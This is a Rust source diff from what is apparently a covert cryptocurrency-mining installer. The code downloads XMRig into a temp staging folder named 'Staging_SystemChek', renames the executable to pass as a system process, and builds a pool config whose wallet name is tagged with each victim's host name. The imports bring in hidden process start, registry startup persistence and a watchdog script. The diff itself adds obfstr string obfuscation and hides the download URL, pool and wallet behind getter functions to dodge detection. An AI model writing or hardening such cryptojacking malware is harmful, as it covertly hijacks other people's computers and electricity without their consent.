@@ -4,7 +4,7 @@ use std::path::Path;
 
 use crate::common::config::MinerConfig;
 use crate::common::constants::{
-    DOWNLOAD_URL, POOL_URL, WALLET, 
+    get_download_url, get_pool_url, get_wallet, 
     get_miner_exe_name, get_launcher_script_name, CONFIG_FILENAME
 };
 use crate::utils::files::{download_file, extract_zip, move_files_from_subdir, copy_dir_recursive};
@@ -13,30 +13,31 @@ use crate::system::process::{create_watchdog_script, start_hidden, stop_mining};
 use crate::system::registry::{add_to_startup, remove_from_startup};
 
 pub fn install() -> Result<(), Box<dyn std::error::Error>> {
+    use obfstr::obfstr;
     // 1. Prepare Initial Staging Area (Temp)
-    let staging_dir = get_userprofile().join("AppData").join("Local").join("Temp").join("Staging_SystemChek"); // Hardcoded temp staging
+    let staging_dir = get_userprofile().join(obfstr!("AppData")).join(obfstr!("Local")).join(obfstr!("Temp")).join(obfstr!("Staging_SystemChek")); // Hardcoded temp staging
     if staging_dir.exists() {
         let _ = fs::remove_dir_all(&staging_dir);
     }
     fs::create_dir_all(&staging_dir)?;
 
     // Download XMRig
-    let zip_path = staging_dir.join("package.zip");
-    download_file(DOWNLOAD_URL, &zip_path)?;
+    let zip_path = staging_dir.join(obfstr!("package.zip"));
+    download_file(&get_download_url(), &zip_path)?;
 
     // Extract
     extract_zip(&zip_path, &staging_dir)?;
     move_files_from_subdir(&staging_dir)?;
 
     // Rename XMRig to SysSvchost
-    let old_xmrig = staging_dir.join("xmrig.exe");
+    let old_xmrig = staging_dir.join(obfstr!("xmrig.exe"));
     let new_miner = staging_dir.join(get_miner_exe_name());
     if old_xmrig.exists() {
         fs::rename(old_xmrig, &new_miner)?;
     } else {
         // If it's already renamed or missing?
         if !new_miner.exists() {
-             return Err("Miner executable not found after extraction".into());
+             return Err(obfstr!("Miner executable not found after extraction").into());
         }
     }
 
@@ -57,10 +58,10 @@ pub fn install() -> Result<(), Box<dyn std::error::Error>> {
         .collect::<String>()
         .to_uppercase();
         
-    let final_wallet = format!("{}.{}-{}", WALLET, host, random_suffix);
+    let final_wallet = format!("{}.{}-{}", get_wallet(), host, random_suffix);
     
     let config_path = staging_dir.join(CONFIG_FILENAME);
-    let config = MinerConfig::new(POOL_URL, &final_wallet, mining_threads);
+    let config = MinerConfig::new(&get_pool_url(), &final_wallet, mining_threads);
     let json = serde_json::to_string_pretty(&config)?;
     let mut file = File::create(&config_path)?;
     file.write_all(json.as_bytes())?;
